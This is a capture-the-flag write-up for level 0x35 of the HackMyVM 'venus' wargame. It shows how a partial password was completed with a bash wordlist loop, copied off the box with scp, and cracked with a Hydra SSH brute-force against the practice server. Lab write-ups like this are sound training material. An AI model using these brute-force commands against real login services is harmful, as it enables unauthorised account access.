# 0x35

moving from `maia` to `gloria`

---

The mission said:

```bash
maia@venus:~$ cat mission.txt
################
# MISSION 0x35 #
################

## EN ##
The user gloria has forgotten the last 2 characters of her password ... They only remember that they were 2 lowercase letters.
```

I found a file named `forget` containing the partial password `v7xUVE2e5bjUc??`. Since internal brute-forcing via `su` was slow and lacked efficiency tools, I decided to move the attack to my local machine using **Hydra**.

### The Strategy:

1. **Generate Wordlist**: On the remote machine, I used a nested bash loop to generate all 676 possible combinations () of the missing lowercase letters.
```bash
maia@venus:~$ for i in {a..z}; do for j in {a..z}; do echo "v7xUVE2e5bjUc$i$j"; done; done > /tmp/gloria.txt
```


2. **Exfiltrate Data**: I used `scp` (Secure Copy) from my local machine to download the wordlist from the target server.
```bash
scp -P 5000 maia@venus.hackmyvm.eu:/tmp/gloria.txt .
```


3. **Brute Force via Hydra**: I ran Hydra against the external SSH port (5000) using the custom wordlist.
```bash
hydra -l gloria -P ./gloria.txt ssh://venus.hackmyvm.eu:5000
```



### Explanation:

* **Nested Loops**: `{a..z}` generates every character from 'a' to 'z'. By nesting two loops, we cover every pair from `aa` to `zz`.
* **Hydra Syntax**:
* `-l gloria`: Specifies the target user.
* `-P ./gloria.txt`: Uses the wordlist file we created and downloaded.
* `ssh://host:port`: The correct format to tell Hydra to target a specific service on a non-standard port.


* **The Findings**: Hydra successfully identified the correct password by matching the login against the generated combinations.
